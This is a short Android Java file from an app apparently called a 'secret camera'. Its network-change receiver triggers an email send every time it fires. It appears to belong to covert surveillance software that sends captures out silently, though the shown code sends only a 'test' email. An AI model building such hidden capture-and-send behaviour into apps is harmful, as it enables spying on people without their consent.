package com.android.krishsecretcamera;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class NetworkChangeReceiver extends BroadcastReceiver {



    @Override
    public void onReceive(Context context, Intent intent) {
           MailSender sender=new MailSender(context);
           sender.sendTestEmail();
    }
}
